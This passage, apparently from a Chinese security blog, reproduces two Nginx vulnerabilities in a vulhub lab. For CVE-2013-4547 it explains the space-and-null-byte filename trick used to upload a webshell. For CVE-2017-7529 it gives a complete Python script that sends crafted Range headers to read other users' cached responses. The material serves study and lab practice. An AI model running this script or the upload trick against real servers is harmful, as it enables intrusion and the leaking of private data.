+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中,送入的文件名会被交给.php$这个正则处理,如果满足就被送入location,不满足就丢给别的模块处理</p>
+<p>在存在CVE-2013-4547的情况下，我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$，可以进入这个Location块；但进入后，0x00截至符把后面的内容屏蔽了,Nginx就错误地认为请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。fastcgi根据SCRIPT_FILENAME的值进行解析，然后后续所有针对文件名的过滤就都失效了. 漏洞的利用条件是nginx版本在 0.8.41～1.4.3， 1.5 ~ 1.5.7 漏洞复现</p>
+<p>漏洞的利用条件是nginx版本在0.8.41<del>1.4.3，1.5</del>1.5.7</p>
+<h3 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4547%E7%A0%B4%E8%A7%A3.png" class>
+
+<ul>
+<li><p>在该漏洞中，非法字符空格和截止符（\0）可能会导致 Nginx 在解析 URI 时的有限状态机（Finite State Machine）出现混乱。有限状态机是一种计算模型，用于描述具有有限数量状态和规则转换的系统。在 Nginx 中，有限状态机用于解析和处理客户端请求。 </p>
+</li>
+<li><p>举个例子来说明：假设服务器上存在一个文件名为 “file.aaa “，注意文件名的最后一个字符是空格。在正常情况下，当我们使用 URI 访问该文件时，应该是：”<a href="http://example.com/file.aaa">http://example.com/file.aaa</a> “。然而，在存在该漏洞的情况下，攻击者可以通过构造特殊的请求来绕过 URI 后缀名限制。 </p>
+</li>
+<li><p>例如，攻击者可以发送一个请求：”<a href="http://example.com/file.aaa">http://example.com/file.aaa</a> \0.bbb”。这里 “%20” 是 URL 编码表示的空格字符。由于有限状态机在解析 URI 时无法正确处理空格字符，Nginx 可能会误认为请求的文件后缀是 “.bbb “，而忽略了空格前的内容。这样，攻击者就能够绕过原本的后缀名限制，访问到服务器上的文件。</p>
+</li>
+</ul>
+<p>先上传一个木马文件试试</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4547%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>这里能看到访问失败了，根据这个漏洞的原理，我们抓包在16进制编辑器里面插入16进制的20和00就行</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4547%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>可以看到上传成功，尝试用蚁剑连接</p>
+<p>蚁剑连接失败，不知道是为啥，这里就不管了，不过修改木马文件内容为phpinfo()是可以看到有关php的相关信息的。</p>
+<h2 id="CVE-2017-7529（Nginx越界读取缓存漏洞）"><a href="#CVE-2017-7529（Nginx越界读取缓存漏洞）" class="headerlink" title="CVE-2017-7529（Nginx越界读取缓存漏洞）"></a>CVE-2017-7529（Nginx越界读取缓存漏洞）</h2><ul>
+<li>HTTP 断点续传是一种机制，允许客户端在下载或上传大型文件时能够在中断和恢复的情况下继续传输文件，而无需重新开始整个传输过程。Range 头字段是用于实现断点续传的关键。</li>
+<li>Range 头字段用于指定客户端希望从服务器端获取的资源的特定范围。它的格式为 Range: bytes&#x3D;start-end，其中 start 是起始字节位置，end是结束字节位置（可选）。</li>
+<li>当客户端发送带有 Range 头的请求时，服务器会根据该范围返回相应的文件片段。这使得客户端可以通过多次发送请求来逐步下载整个文件，或者在下载过程中暂停并继续下载。</li>
+<li>以下是使用 Range 头实现断点续传的示例：</li>
+</ul>
+<p>客户端发起带有Range头的GET请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copy CodeGET /path/to/file HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Range: bytes=0-99</span><br></pre></td></tr></table></figure>
+
+<p>服务器相应带有指定范围的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copy CodeHTTP/1.1 206 Partial Content</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Content-Range: bytes 0-999/2000</span><br><span class="line"></span><br><span class="line">&lt;file_bytes&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意，服务器的响应状态码是 206 Partial Content，并且响应头中包含了 Content-Range 字段，指示服务器返回的数据范围。客户端接收到响应后，可以将获取的文件片段保存到本地文件中。</li>
+<li>如果客户端在后续请求中需要继续传输文件的其他部分，只需更新 Range 头字段的范围，再次发送带有 Range 头的 GET 请求。</li>
+</ul>
+<h3 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a>复现</h3><p>首先访问一下8080端口的服务</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/7529%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>当用户发起请求时，Nginx会先检查是否有与请求匹配的缓存文件存在。如果存在缓存文件并且命中了请求，则不需要再次访问后端服务器，Nginx会直接从缓存文件中读取HTTP返回包体，并将其返回给用户。这节省了从后端服务器获取数据的时间，提高了响应速度和性能。 </p>
+<p>缓存的文件通常包含文件头、HTTP返回包头和HTTP返回包体。文件头包含了额外的信息，例如缓存的创建时间和过期时间等。HTTP返回包头则包含了原始服务器返回的响应头部信息，例如状态码、内容类型、缓存策略等。而HTTP返回包体则是服务器返回的实际内容，比如网页的HTML代码或者静态文件的二进制数据。 </p>
+<p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。这样就实现了读了别的请求的缓存文件,相当于获取了别人的请求内容.</p>
+<p>直接用脚本打</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(&quot;%s url&quot; % (sys.argv[0]))</span><br><span class="line">    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;</span><br><span class="line">&#125;</span><br><span class="line">offset = 605</span><br><span class="line">url = sys.argv[1]</span><br><span class="line">file_len = len(requests.get(url, headers=headers).content)</span><br><span class="line">n = file_len + offset</span><br><span class="line">headers[&#x27;Range&#x27;] = &quot;bytes=-%d,-%d&quot; % (</span><br><span class="line">    n, 0x8000000000000000 - n)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python 1.py http://192.168.10.129:8080/</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/7529%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>成功读取缓存</p>
+]]></content>
+  </entry>
 </search>
